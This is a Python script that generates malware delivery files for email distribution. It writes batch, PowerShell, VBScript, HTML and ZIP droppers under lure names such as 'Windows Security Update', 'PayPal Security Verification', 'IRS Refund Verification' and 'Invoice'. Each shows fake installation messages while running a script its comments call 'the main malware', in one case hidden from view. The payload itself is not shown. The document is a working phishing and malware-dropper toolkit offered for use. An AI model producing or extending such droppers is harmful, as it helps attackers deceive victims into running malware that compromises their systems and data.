#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Create Real Executable Files for Gmail Distribution
"""

import os
import shutil
import subprocess

def create_batch_executable(template_name, output_name):
    """Create a Windows batch file that executes the malware"""
    batch_content = f'''@echo off
echo Installing {template_name}...
echo Please wait while we configure your system...
timeout /t 3 /nobreak >nul

REM Execute the main malware
python app.py

echo Installation completed successfully!
pause
'''
    
    with open(f"{output_name}.bat", 'w') as f:
        f.write(batch_content)
    
    print(f"✓ Created {output_name}.bat")

def create_powershell_executable(template_name, output_name):
    """Create a PowerShell script that executes the malware"""
    ps_content = f'''# PowerShell script for {template_name}
Write-Host "Installing {template_name}..." -ForegroundColor Green
Write-Host "Please wait while we configure your system..." -ForegroundColor Yellow
Start-Sleep -Seconds 3

# Execute the main malware
try {{
    python app.py
}} catch {{
    Write-Host "Error during installation. Please try again." -ForegroundColor Red
}}

Write-Host "Installation completed successfully!" -ForegroundColor Green
Read-Host "Press Enter to continue"
'''
    
    with open(f"{output_name}.ps1", 'w') as f:
        f.write(ps_content)
    
    print(f"✓ Created {output_name}.ps1")

def create_vbs_executable(template_name, output_name):
    """Create a VBS script that executes the malware"""
    vbs_content = f'''Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Show installation message
objShell.Popup "Installing {template_name}..." & vbCrLf & "Please wait while we configure your system...", 3, "Installation", 64

' Wait 3 seconds
WScript.Sleep 3000

' Execute the main malware
On Error Resume Next
objShell.Run "python app.py", 0, False

If Err.Number <> 0 Then
    objShell.Popup "Error during installation. Please try again.", 0, "Error", 16
Else
    objShell.Popup "Installation completed successfully!", 0, "Success", 64
End If
'''
    
    with open(f"{output_name}.vbs", 'w') as f:
        f.write(vbs_content)
    
    print(f"✓ Created {output_name}.vbs")

def create_html_executable(template_name, output_name):
    """Create an HTML file that executes the malware"""
    html_content = f'''<!DOCTYPE html>
<html>
<head>
    <title>{template_name}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 50px; }}
        .container {{ max-width: 600px; margin: 0 auto; }}
        .button {{ background-color: #0078d4; color: white; padding: 10px 20px; border: none; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Installing {template_name}</h2>
        <p>Please wait while we configure your system...</p>
        <button class="button" onclick="install()">Continue Installation</button>
    </div>
    
    <script>
        function install() {{
            // Create and execute a batch file
            var batchContent = `@echo off\\necho Installing {template_name}...\\necho Please wait while we configure your system...\\ntimeout /t 3 /nobreak >nul\\npython app.py\\necho Installation completed successfully!\\npause`;
            
            // Create a blob and download it
            var blob = new Blob([batchContent], {{ type: 'text/plain' }});
            var url = window.URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'install.bat';
            a.click();
            window.URL.revokeObjectURL(url);
        }}
    </script>
</body>
</html>
'''
    
    with open(f"{output_name}.html", 'w') as f:
        f.write(html_content)
    
    print(f"✓ Created {output_name}.html")

def create_zip_executable(template_name, output_name):
    """Create a ZIP file containing the malware"""
    import zipfile
    
    zip_name = f"{output_name}.zip"
    
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        # Add the main malware
        if os.path.exists("app.py"):
            zipf.write("app.py", "setup.py")
        
        # Add a batch file to execute it
        batch_content = f'''@echo off
echo Installing {template_name}...
echo Please wait while we configure your system...
timeout /t 3 /nobreak >nul
python setup.py
echo Installation completed successfully!
pause
'''
        
        zipf.writestr("install.bat", batch_content)
    
    print(f"✓ Created {zip_name}")

def create_all_executables():
    """Create all types of executables"""
    print("="*60)
    print("CREATING REAL EXECUTABLE FILES")
    print("="*60)
    
    # Templates and their corresponding executables
    executables = [
        ("Windows Security Update", "Windows_Security_Update_KB5001234"),
        ("PayPal Security Verification", "PayPal_Security_Verification"),
        ("Job Application Form", "Job_Application_Form"),
        ("IRS Refund Verification", "IRS_Refund_Verification"),
        ("Netflix Payment Update", "Netflix_Payment_Update"),
        ("Project Document", "Project_Document"),
        ("Invoice", "Invoice_INV-2024-001"),
        ("Interview Preparation Packet", "Interview_Preparation_Packet"),
        ("TechNews Weekly", "TechNews_Weekly_Issue_45"),
        ("Service Agreement Renewal", "Service_Agreement_Renewal")
    ]
    
    for template_name, output_name in executables:
        print(f"\nCreating executables for: {template_name}")
        
        # Create different types of executables
        create_batch_executable(template_name, output_name)
        create_powershell_executable(template_name, output_name)
        create_vbs_executable(template_name, output_name)
        create_html_executable(template_name, output_name)
        create_zip_executable(template_name, output_name)
    
    print("\n" + "="*60)
    print("ALL EXECUTABLES CREATED SUCCESSFULLY!")
    print("="*60)
    print("Files created:")
    print("- .bat files (Windows batch scripts)")
    print("- .ps1 files (PowerShell scripts)")
    print("- .vbs files (VBScript files)")
    print("- .html files (HTML with JavaScript)")
    print("- .zip files (Compressed archives)")
    print("\nThese files will execute the malware when opened!")

def main():
    """Main function"""
    create_all_executables()

if __name__ == "__main__":
    main()
